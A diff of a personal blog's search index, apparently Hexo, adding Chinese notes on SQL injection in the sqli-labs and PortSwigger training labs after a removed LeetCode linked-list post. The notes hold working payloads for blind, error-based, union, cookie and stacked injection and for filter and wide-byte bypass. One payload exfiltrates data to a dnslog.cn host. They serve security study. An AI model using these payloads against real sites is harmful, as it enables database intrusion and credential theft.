-<h1 id="1-环形链表"><a href="#1-环形链表" class="headerlink" title="1.环形链表"></a>1.环形链表</h1><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p>
-<p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p>
-<p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>
-
-<h2 id="法1（哈希表）"><a href="#法1（哈希表）" class="headerlink" title="法1（哈希表）"></a>法1（哈希表）</h2><p>哈希表加遍历：每次遍历时，通过哈希表查看该指针是否访问过</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        set&lt;ListNode*&gt; st;</span><br><span class="line">        ListNode* p1=head;</span><br><span class="line">        <span class="keyword">while</span>(p1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(p1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">insert</span>(p1);</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>O(n)</p>
-<p>O(n)</p>
-</blockquote>
-<h2 id="法2（快慢指针）"><a href="#法2（快慢指针）" class="headerlink" title="法2（快慢指针）"></a>法2（快慢指针）</h2><p>这个代码不对</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool hasCycle(ListNode *head) &#123;</span><br><span class="line">        if(head==nullptr) return false; //没有元素</span><br><span class="line">        else if(head-&gt;next==nullptr) return false; //有1个元素</span><br><span class="line">        else if(head-&gt;next-&gt;next=head) return true;//有两个元素</span><br><span class="line"></span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next-&gt;next;</span><br><span class="line">        while(p1&amp;&amp;p2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(p1==p2-&gt;next) return true;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">            p2=p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>[1,2]</p>
-<p>-1</p>
-<p>输出：true</p>
-<p>预期输出：false</p>
-</blockquote>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p1!=p2)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span>(p2==<span class="literal">nullptr</span> || p2-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           p1=p1-&gt;next;</span><br><span class="line">           p2=p2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p>
-<p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N 轮。</p>
-<blockquote>
-<p>O(n)</p>
-<p>O(1)</p>
-</blockquote>
-<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p>
-<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
-<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure>
-
-<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2>]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>链表</tag>
-        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -16622,8 +16778,8 @@
         <category>php反序列化</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>php反序列化</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -16816,9 +16972,234 @@
       </categories>
       <tags>
         <tag>xss</tag>
-        <tag>xxe</tag>
-        <tag>php反序列化</tag>
         <tag>csrf/ssrf</tag>
+        <tag>php反序列化</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs</title>
+    <url>/2023/05/20/sqli-labs/</url>
+    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
+<h2 id="less-9-（单引号时间盲注）"><a href="#less-9-（单引号时间盲注）" class="headerlink" title="less 9 （单引号时间盲注）"></a>less 9 （单引号时间盲注）</h2><p>id&#x3D;1 id&#x3D;1’没有回显</p>
+<p>尝试id&#x3D;1’ and sleep(5)–+ 5s后显示  (注释符#也是没用的)</p>
+<p>id&#x3D; 1’ and if(length(database())&gt;0,sleep(5),1)–+</p>
+<p>id&#x3D;1’ and if(substr(database(),1,1)&gt;’a’,sleep(5),1)–+</p>
+<p>或者</p>
+<p>if(ascii(substr(database(),1,1))&gt;64,sleep(5),1)–+ 也是可以的</p>
+<p>爆破即可</p>
+<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p><code>id=1‘ and (select load_file(concat(‘\\\\’,(select hex(user())),‘.ho26y3.dnslog.cn/abc’)))--+</code></p>
+<p><img src="/../../../Typora/img111/image-20230706140021367.png"></p>
+<p>对726F6F7440解码即可</p>
+<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
+<p>发现提示</p>
+<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
+<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
+<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
+<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
+<blockquote>
+<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
+</blockquote>
+<p>可以判定是有单引号的闭合</p>
+<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
+<blockquote>
+<p>the right syntax to use near ‘’ at line 1</p>
+</blockquote>
+<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
+<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
+<blockquote>
+<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
+<blockquote>
+<p>XPATH syntax error: ‘^security’</p>
+</blockquote>
+<p>and替换成or也是可以的</p>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
+<blockquote>
+<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
+<blockquote>
+<p>XPATH syntax error: ‘^id,username,password’</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
+<blockquote>
+<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
+</blockquote>
+<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
+<blockquote>
+<p>Column count doesn’t match value count at row 1</p>
+</blockquote>
+<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
+<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
+</blockquote>
+<p>所以要闭合VALUES.</p>
+<p>利用$uagent，故构建格式，1’,1,1)#</p>
+<p>则：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
+</blockquote>
+<p>即：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
+</blockquote>
+<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
+<blockquote>
+<p>  XPATH syntax error: ‘^security’</p>
+</blockquote>
+<p>其余语句类似思路1。</p>
+<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
+<p>admin’，有报错信息…LIMIT..</p>
+<p>注释掉后，即admin’#，页面正常。</p>
+<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
+<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
+<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
+<p>嗯，报错注入也是可行的</p>
+<h2 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h2><p>id&#x3D;1’ 报错</p>
+<p>id&#x3D;1’–+回显成功<br><code>?id=0&#39; union select 1,user(),database(); insert into users(username,password) values(&#39;stack&#39;, &#39;stack&#39;)%23</code></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入之联合注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
+<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
+<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+<p>1、    判断注入点</p>
+<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
+<p>2、    判断<strong>闭合</strong>形式</p>
+<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
+<p>3、判断查询列数</p>
+<p>1’ order by 1–+</p>
+<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
+<p>20231008<strong>更新一下</strong></p>
+<p>除了order by，还可以用以下方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>然后，尝试替换位置</p>
+<blockquote>
+<p>平时都是union select 1,2,3，这种方法失效了嘞</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">272</span><span class="operator">%</span><span class="number">27</span><span class="comment">--+ #两个位置都有的话</span></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>username,password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+ #替换字段</span></span><br><span class="line"></span><br><span class="line">#如果只能显示一个位置</span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,username<span class="operator">||</span><span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span><span class="operator">||</span>password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,concat(username,<span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span>,password)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line">#wiener<span class="operator">~</span><span class="number">5</span>qgm</span><br><span class="line"></span><br><span class="line">#数据库信息</span><br><span class="line"></span><br><span class="line">Database type	Query</span><br><span class="line">Microsoft, MySQL	<span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line">Oracle	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$version</span><br><span class="line">PostgreSQL	<span class="keyword">SELECT</span> version()</span><br><span class="line"></span><br><span class="line">s<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>@<span class="variable">@version</span>)<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; union select &#x27;</span><span class="number">1</span><span class="string">&#x27;,(version())--</span></span><br><span class="line"><span class="string">#如果成功，证明是一个MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出数据库内容</span></span><br><span class="line"><span class="string">#除了Oracle，大部分数据库都有一套自己的information_schema</span></span><br><span class="line"><span class="string">#以postgresql为例</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆数据库的表名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,table_name <span class="keyword">from</span> information_schema.tables<span class="comment">--</span></span><br><span class="line">#<span class="string">&#x27; union select NULL,(select table_name from #information_schema.tables)-- 不行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#它还必须有一个是NULL，不像sqli-lab的 union select 1,table_name from...</span></span><br><span class="line"><span class="string">#貌似也没有  union select 1,(select * from information_schema.tables),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆表的列名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users_edheuq&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">#爆列的字段</span><br><span class="line"><span class="string">&#x27; union select username_cnxxxn,password_omaiyx from users_edheuq--</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<p>4、判断显示位</p>
+<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
+<p>常用语句为-1’ union select 1,2,3–+</p>
+<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
+<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
+<p>5、获取所有数据库名</p>
+<p>6、获取数据库所有表名</p>
+<p>7、获取字段名 </p>
+<p>8、获取字段中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-tips</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
+    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
+<p><strong>;%00</strong>代替–+进行注释</p>
+<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
+<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
+<p>没括号则是id&#x3D;2页面</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
+<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
+<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
+</blockquote>
+<blockquote>
+<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
+</blockquote>
+<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
+<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
+<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
+<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
+<p><strong>mysql_real_escape_string() 函数</strong></p>
+<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
+<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
+<ul>
+<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<blockquote>
+<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
+<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
